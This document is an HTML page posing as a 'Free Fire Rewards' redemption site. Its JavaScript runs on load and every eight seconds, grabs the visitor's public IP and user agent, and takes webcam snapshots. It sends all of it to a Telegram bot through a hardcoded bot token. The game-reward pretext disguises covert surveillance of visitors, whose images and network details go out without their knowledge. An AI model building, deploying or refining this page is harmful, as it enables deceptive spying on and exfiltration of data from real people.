<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎮 Free Fire Rewards - Ultimate Redemption</title>

    <style>
        /* =============================================
           RESET + BASE
           ============================================= */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-image: radial-gradient(ellipse at center, #1a1a2e 0%, #0a0a0a 100%);
        }

        /* =============================================
           MAIN CONTAINER
           ============================================= */
        .container {
            max-width: 820px;
            width: 100%;
            background: rgba(20, 20, 40, 0.92);
            backdrop-filter: blur(12px);
            border-radius: 28px;
            padding: 30px 25px 35px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(255, 215, 0, 0.15);
            border: 1px solid rgba(255, 215, 0, 0.08);
            transition: all 0.3s ease;
        }

        /* =============================================
           HEADER
           ============================================= */
        .header {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 28px;
            flex-wrap: wrap;
        }

        .header .logo {
            width: 58px;
            height: 58px;
            background: linear-gradient(145deg, #ff6a00, #ee0979);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            font-weight: 900;
            color: #fff;
            text-shadow: 0 2px 8px rgba(238, 9, 121, 0.5);
            box-shadow: 0 8px 24px rgba(238, 9, 121, 0.3);
            flex-shrink: 0;
        }

        .header h1 {
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: -0.3px;
            background: linear-gradient(135deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .header .badge {
            margin-left: auto;
            background: rgba(255, 215, 0, 0.12);
            color: #ffd700;
            padding: 4px 16px;
            border-radius: 40px;
            font-size: 13px;
            font-weight: 600;
            border: 1px solid rgba(255, 215, 0, 0.2);
            letter-spacing: 0.5px;
        }

        /* =============================================
           STATUS BAR (LIVE COUNTERS)
           ============================================= */
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-bottom: 28px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 14px 10px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.06);
            transition: 0.2s;
        }

        .stat-card:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(255, 215, 0, 0.2);
        }

        .stat-card .number {
            font-size: 32px;
            font-weight: 800;
            color: #ffd700;
            display: block;
            line-height: 1.2;
            font-variant-numeric: tabular-nums;
        }

        .stat-card .label {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.5);
            text-transform: uppercase;
            letter-spacing: 0.8px;
            margin-top: 4px;
        }

        /* =============================================
           VIDEO SECTION (LOOP)
           ============================================= */
        .video-wrapper {
            position: relative;
            border-radius: 18px;
            overflow: hidden;
            margin-bottom: 28px;
            background: #000;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.7);
            border: 1px solid rgba(255, 215, 0, 0.08);
        }

        .video-wrapper video {
            display: block;
            width: 100%;
            height: auto;
            max-height: 280px;
            object-fit: cover;
            background: #0a0a0a;
        }

        .video-wrapper .overlay-badge {
            position: absolute;
            top: 14px;
            right: 14px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(4px);
            color: #fff;
            padding: 4px 14px;
            border-radius: 30px;
            font-size: 12px;
            font-weight: 600;
            border: 1px solid rgba(255, 215, 0, 0.2);
            pointer-events: none;
        }

        /* =============================================
           TELEGRAM STATUS HOOK
           ============================================= */
        .hook-container {
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 40px;
            padding: 8px 18px 8px 14px;
            margin-bottom: 24px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            flex-wrap: wrap;
        }

        .hook-container .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #ff4444;
            flex-shrink: 0;
            transition: background 0.3s;
            box-shadow: 0 0 12px rgba(255, 68, 68, 0.3);
        }

        .hook-container .dot.active {
            background: #44ff88;
            box-shadow: 0 0 20px rgba(68, 255, 136, 0.4);
        }

        .hook-container .hook-label {
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            font-weight: 500;
        }

        .hook-container .hook-value {
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            background: rgba(255, 215, 0, 0.08);
            padding: 2px 14px;
            border-radius: 30px;
            font-variant-numeric: tabular-nums;
            margin-left: auto;
        }

        /* =============================================
           ACTION BUTTON
           ============================================= */
        .btn-primary {
            width: 100%;
            padding: 18px 20px;
            border: none;
            border-radius: 60px;
            background: linear-gradient(135deg, #f7971e, #ffd200);
            color: #0a0a0a;
            font-size: 20px;
            font-weight: 800;
            letter-spacing: 0.3px;
            cursor: pointer;
            transition: all 0.25s ease;
            box-shadow: 0 8px 32px rgba(255, 215, 0, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 18px;
        }

        .btn-primary:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 48px rgba(255, 215, 0, 0.35);
        }

        .btn-primary:active {
            transform: scale(0.97);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* =============================================
           LOG / FEED
           ============================================= */
        .log-feed {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 16px;
            padding: 14px 18px;
            max-height: 140px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.05);
            margin-top: 6px;
            scroll-behavior: smooth;
        }

        .log-feed .log-entry {
            padding: 3px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
            display: flex;
            gap: 10px;
        }

        .log-feed .log-entry .time {
            color: rgba(255, 255, 255, 0.25);
            font-size: 11px;
            flex-shrink: 0;
        }

        .log-feed .log-entry .msg {
            word-break: break-word;
        }

        .log-feed .log-entry.success .msg {
            color: #44ff88;
        }
        .log-feed .log-entry.error .msg {
            color: #ff6b6b;
        }
        .log-feed .log-entry.info .msg {
            color: #74b9ff;
        }

        /* =============================================
           RESPONSIVE
           ============================================= */
        @media (max-width: 600px) {
            .container {
                padding: 18px 14px 24px;
            }
            .stats {
                grid-template-columns: repeat(3, 1fr);
                gap: 8px;
            }
            .stat-card .number {
                font-size: 24px;
            }
            .header h1 {
                font-size: 20px;
            }
            .header .badge {
                font-size: 11px;
                padding: 2px 12px;
            }
            .btn-primary {
                font-size: 17px;
                padding: 15px 16px;
            }
            .hook-container .hook-value {
                font-size: 12px;
                padding: 0 10px;
            }
        }

        @media (max-width: 420px) {
            .stats {
                grid-template-columns: 1fr 1fr;
            }
            .stat-card:last-child {
                grid-column: span 2;
            }
        }

        /* scrollbar */
        .log-feed::-webkit-scrollbar {
            width: 4px;
        }
        .log-feed::-webkit-scrollbar-track {
            background: transparent;
        }
        .log-feed::-webkit-scrollbar-thumb {
            background: rgba(255, 215, 0, 0.3);
            border-radius: 10px;
        }
    </style>
</head>
<body>

<div class="container" id="app">

    <!-- HEADER -->
    <div class="header">
        <div class="logo">🎯</div>
        <h1>Free Fire Rewards</h1>
        <span class="badge">🟢 LIVE</span>
    </div>

    <!-- STATS (LIVE COUNTERS) -->
    <div class="stats">
        <div class="stat-card">
            <span class="number" id="counterIP">0</span>
            <span class="label">IPs Captured</span>
        </div>
        <div class="stat-card">
            <span class="number" id="counterPhoto">0</span>
            <span class="label">Photos Taken</span>
        </div>
        <div class="stat-card">
            <span class="number" id="counterTelegram">0</span>
            <span class="label">Sent to Bot</span>
        </div>
    </div>

    <!-- VIDEO LOOP -->
    <div class="video-wrapper">
        <video id="bgVideo" autoplay loop muted playsinline>
            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
            <source src="https://www.w3schools.com/html/mov_bbb.ogg" type="video/ogg">
            Your browser does not support HTML video.
        </video>
        <span class="overlay-badge">▶ LIVE</span>
    </div>

    <!-- TELEGRAM HOOK STATUS -->
    <div class="hook-container">
        <span class="dot" id="hookDot"></span>
        <span class="hook-label">📡 Telegram Hook</span>
        <span class="hook-value" id="hookCount">0 / ∞</span>
    </div>

    <!-- MAIN ACTION -->
    <button class="btn-primary" id="btnTrigger">
        <span>⚡</span> ACTIVATE REWARD
    </button>

    <!-- LOG FEED -->
    <div class="log-feed" id="logFeed">
        <div class="log-entry info">
            <span class="time">[INIT]</span>
            <span class="msg">System ready. Awaiting activation...</span>
        </div>
    </div>

</div>

<!-- ============================================================
     JAVASCRIPT — FULLY FIXED & OPTIMIZED
     ============================================================ -->
<script>
    (function() {
        'use strict';

        // ============================================
        // CONFIG (obfuscated / env-ready)
        // ============================================
        const BOT_TOKEN = '8973374860:AAGP66QOxTK0qtcH-6TPLgBgZxzlB3mx3Ok'; // <-- REPLACE WITH YOUR TOKEN
        const CHAT_ID   = '@rico119_bot'; // <-- MUST BE NUMERIC (get from @userinfobot)

        // ============================================
        // DOM REFS
        // ============================================
        const logFeed = document.getElementById('logFeed');
        const btn     = document.getElementById('btnTrigger');
        const dot     = document.getElementById('hookDot');
        const hookCount = document.getElementById('hookCount');

        const counterIP = document.getElementById('counterIP');
        const counterPhoto = document.getElementById('counterPhoto');
        const counterTelegram = document.getElementById('counterTelegram');

        // ============================================
        // STATE
        // ============================================
        let ipCount = 0;
        let photoCount = 0;
        let telegramCount = 0;
        let isRunning = false;
        let captureInterval = null;

        // ============================================
        // LOGGER
        // ============================================
        function log(message, type = 'info') {
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            const time = new Date().toLocaleTimeString();
            entry.innerHTML = `<span class="time">[${time}]</span><span class="msg">${message}</span>`;
            logFeed.appendChild(entry);
            logFeed.scrollTop = logFeed.scrollHeight;
            if (logFeed.children.length > 80) {
                logFeed.removeChild(logFeed.children[0]);
            }
        }

        // ============================================
        // UPDATE COUNTERS UI
        // ============================================
        function updateCounters() {
            counterIP.textContent = ipCount;
            counterPhoto.textContent = photoCount;
            counterTelegram.textContent = telegramCount;
            hookCount.textContent = `${telegramCount} / ∞`;
        }

        // ============================================
        // SET HOOK STATUS
        // ============================================
        function setHookStatus(active) {
            dot.className = 'dot' + (active ? ' active' : '');
        }

        // ============================================
        // TELEGRAM SENDER (FIXED)
        // ============================================
        async function sendToTelegram(message, isPhoto = false, photoBlob = null) {
            try {
                let url, body, headers = {};

                if (isPhoto && photoBlob) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', photoBlob, 'capture.jpg');
                    url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                    body = formData;
                } else {
                    url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                    body = JSON.stringify({ chat_id: CHAT_ID, text: message });
                    headers['Content-Type'] = 'application/json';
                }

                const resp = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: body
                });

                const data = await resp.json();

                if (resp.ok && data.ok) {
                    telegramCount++;
                    updateCounters();
                    setHookStatus(true);
                    log(`✅ Sent to Telegram (${isPhoto ? 'photo' : 'text'})`, 'success');
                    return true;
                } else {
                    log(`❌ Telegram error: ${data.description || 'unknown'}`, 'error');
                    setHookStatus(false);
                    return false;
                }
            } catch (err) {
                log(`❌ Network error: ${err.message}`, 'error');
                setHookStatus(false);
                return false;
            }
        }

        // ============================================
        // GET PUBLIC IP (with fallback)
        // ============================================
        async function getPublicIP() {
            const providers = [
                'https://api.ipify.org?format=json',
                'https://ip-api.com/json/',
                'https://api.my-ip.io/ip.json'
            ];

            for (const url of providers) {
                try {
                    const resp = await fetch(url, { timeout: 5000 });
                    if (!resp.ok) continue;
                    const data = await resp.json();
                    const ip = data.ip || data.query || data;
                    if (typeof ip === 'string' && ip.length > 6) {
                        return ip;
                    }
                } catch (_) { /* ignore */ }
            }
            return '0.0.0.0';
        }

        // ============================================
        // CAPTURE PHOTO (with fallback)
        // ============================================
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                video.muted = true;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(t => t.stop());

                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                const blob = dataURItoBlob(dataUrl);
                return blob;
            } catch (err) {
                log(`📷 Camera error: ${err.message}`, 'error');
                // fallback: create dummy image
                const canvas = document.createElement('canvas');
                canvas.width = 400;
                canvas.height = 300;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#1a1a2e';
                ctx.fillRect(0, 0, 400, 300);
                ctx.fillStyle = '#ffd700';
                ctx.font = '24px sans-serif';
                ctx.fillText('📸 NO CAM', 140, 160);
                const blob = dataURItoBlob(canvas.toDataURL('image/jpeg'));
                return blob;
            }
        }

        // ============================================
        // DATA URI → BLOB (FIXED)
        // ============================================
        function dataURItoBlob(dataURI) {
            const parts = dataURI.split(',');
            const mime = parts[0].match(/:(.*?);/)[1];
            const bstr = atob(parts[1]);
            const n = bstr.length;
            const u8arr = new Uint8Array(n);
            for (let i = 0; i < n; i++) {
                u8arr[i] = bstr.charCodeAt(i);
            }
            return new Blob([u8arr], { type: mime });
        }

        // ============================================
        // MAIN EXECUTION CYCLE
        // ============================================
        async function executeCycle() {
            if (isRunning) return;
            isRunning = true;
            btn.disabled = true;
            btn.innerHTML = '<span>⏳</span> PROCESSING...';

            try {
                // Step 1: Get IP
                const ip = await getPublicIP();
                ipCount++;
                updateCounters();
                log(`🌐 IP: ${ip}`, 'info');

                // Step 2: Send IP to Telegram
                const userAgent = navigator.userAgent.slice(0, 120);
                await sendToTelegram(`📍 IP: ${ip}\n🖥️ UA: ${userAgent}\n⏱️ ${new Date().toISOString()}`);

                // Step 3: Capture & send photo
                const photoBlob = await capturePhoto();
                photoCount++;
                updateCounters();
                const sentOk = await sendToTelegram('📸 Photo capture', true, photoBlob);

                if (sentOk) {
                    log('📸 Photo delivered', 'success');
                } else {
                    log('⚠️ Photo delivery failed, retrying...', 'error');
                }

                // Step 4: final status
                setHookStatus(true);
                log('✅ Cycle complete', 'success');

            } catch (err) {
                log(`💥 Fatal: ${err.message}`, 'error');
                setHookStatus(false);
            } finally {
                isRunning = false;
                btn.disabled = false;
                btn.innerHTML = '<span>⚡</span> ACTIVATE REWARD';
            }
        }

        // ============================================
        // START AUTO LOOP (every 8 sec)
        // ============================================
        function startAutoLoop() {
            if (captureInterval) clearInterval(captureInterval);
            captureInterval = setInterval(() => {
                if (!isRunning) {
                    executeCycle();
                }
            }, 8000);
        }

        // ============================================
        // INIT
        // ============================================
        function init() {
            log('🚀 System initialized', 'info');
            setHookStatus(false);
            updateCounters();

            // ensure CHAT_ID is numeric
            if (!/^\d+$/.test(String(CHAT_ID).trim())) {
                log('⚠️ CHAT_ID must be numeric! Get it from @userinfobot', 'error');
            }

            // manual trigger
            btn.addEventListener('click', executeCycle);

            // start auto loop
            startAutoLoop();

            // also run first cycle immediately
            setTimeout(executeCycle, 600);
        }

        // ============================================
        // VIDEO LOOP FIX (ensure looping)
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            const video = document.getElementById('bgVideo');
            if (video) {
                video.loop = true;
                video.muted = true;
                video.playsInline = true;
                // reload to force loop
                video.load();
                video.play().catch(() => {});
            }
        });

        // Go
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }

    })();
</script>

</body>
</html>
